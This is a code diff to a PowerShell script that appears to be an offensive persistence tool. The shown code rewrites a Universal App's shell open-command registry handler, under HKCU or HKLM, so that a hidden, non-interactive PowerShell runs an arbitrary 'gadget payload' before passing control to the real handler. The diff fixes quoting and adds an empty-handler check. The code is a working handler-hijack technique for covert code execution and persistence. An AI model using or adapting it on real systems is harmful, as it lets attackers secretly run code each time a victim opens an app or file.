@@ -27,8 +27,8 @@ Begin {
     {
         $s0 = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"')
         $s1 = $s0.Replace('{{POWERSHELLVERSION}}', $p)
-        $s2 = $s1.Replace('{{DEFAULTHANDLER}}', "$d")
-        $s3 = $s2.Replace('{{GADGETPAYLOAD}}', "$g")
+        $s2 = $s1.Replace('{{DEFAULTHANDLER}}', "$d".Replace('"', "'"))
+        $s3 = $s2.Replace('{{GADGETPAYLOAD}}', "$g".Replace("''","'"))
         return $s3
     }
 }
@@ -51,14 +51,15 @@ Process {
             # get pathname of the binary of the Universal App (via ordered lookup in HKEY_CURRENT_USER and as fallback in HKLM)
             $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction SilentlyContinue).AppUserModelID
             $currentHandlerValue = $( Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
-            if ( [string]::IsNullOrEmpty($AppUserModelID))
+            if ( [string]::IsNullOrEmpty($appUserModelID) -or [string]::IsNullOrEmpty($currentHandlerValue))
             {
                 $appUserModelID = (Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Application" -ErrorAction Stop).appUserModelID
                 $currentHandlerValue = $( Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue ).'(default)'
+                if ( [string]::IsNullOrEmpty($appUserModelID) -or [string]::IsNullOrEmpty($currentHandlerValue))
+                {
+                    throw "default Universal App handler is empty"
+                }
             }
-            # adapt input payload to be correctly processed by Powershell
-            $gadgetPayload = $gadgetPayload.Replace("''","'")
-            $currentHandlerValue = $currentHandlerValue.Replace('"', "'")
             $finalPayload = GenerateProxyingPayload $powershellVersion $currentHandlerValue $gadgetPayload
             UpdateRegistryKey($finalPayload)
         }
